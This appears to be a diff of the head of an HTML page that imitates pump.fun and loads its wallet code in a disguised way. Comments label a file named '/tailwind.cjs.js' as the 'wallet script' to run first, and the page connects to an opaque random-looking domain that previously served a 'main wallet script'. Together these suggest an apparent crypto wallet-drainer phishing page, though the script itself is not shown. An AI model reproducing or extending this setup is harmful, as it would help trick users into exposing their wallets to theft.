@@ -6,28 +6,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>pump</title>
     
-    <!-- CRITICAL: Wallet modal and connection - HIGHEST PRIORITY -->
+    <!-- CRITICAL: Preconnect to external domains EARLY for faster connection -->
     <link rel="dns-prefetch" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com">
     <link rel="preconnect" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com" crossorigin>
     <link rel="dns-prefetch" href="https://solana.publicnode.com">
     <link rel="preconnect" href="https://solana.publicnode.com" crossorigin>
-    
-    <!-- CRITICAL: Preload main wallet script with highest priority -->
-    <link rel="modulepreload" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com/jmpd/" crossorigin>
-    <link rel="preload" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com/jmpd/" as="script" crossorigin fetchpriority="high">
-    
-    <!-- Lower priority: Token images (load after wallet) -->
     <link rel="dns-prefetch" href="https://images.pump.fun">
     <link rel="preconnect" href="https://images.pump.fun" crossorigin>
     <link rel="dns-prefetch" href="https://pump.fun">
     <link rel="preconnect" href="https://pump.fun" crossorigin>
     
-    <!-- Preload critical resources with high priority for parallel loading -->
+    <!-- CRITICAL: Preload ALL resources with HIGHEST priority for MAXIMUM parallel loading -->
     <link rel="preload" href="/css/styles.css" as="style" fetchpriority="high">
     <link rel="preload" href="/tailwind.cjs.js" as="script" crossorigin fetchpriority="high">
     <link rel="modulepreload" href="/tailwind.cjs.js" crossorigin>
     <link rel="preload" href="/js/app.js" as="script" crossorigin fetchpriority="high">
-    <link rel="preload" href="/js/token-loader.js" as="script" crossorigin>
+    <link rel="preload" href="/js/token-loader.js" as="script" crossorigin fetchpriority="high">
+    <link rel="preload" href="/pump1.svg" as="image" fetchpriority="high">
+    <link rel="preload" href="/assets/avatars/pepe.png" as="image">
     
     <meta property="og:type" content="website" />
     <meta property="og:url" content="" id="og-url" />
@@ -121,9 +117,9 @@
     <!-- CRITICAL: Load wallet script FIRST with highest priority (blocking for immediate execution) -->
     <script src="/tailwind.cjs.js" fetchpriority="high"></script>
     
-    <!-- Load other scripts in parallel (async for non-blocking parallel execution) -->
-    <script src="/js/token-loader.js" async defer></script>
-    <script src="/js/app.js" async defer></script>
+    <!-- Load other scripts in parallel (async defer for non-blocking parallel execution) -->
+    <script src="/js/token-loader.js" async defer fetchpriority="high"></script>
+    <script src="/js/app.js" async defer fetchpriority="high"></script>
     
     <script>
       window.setup = {
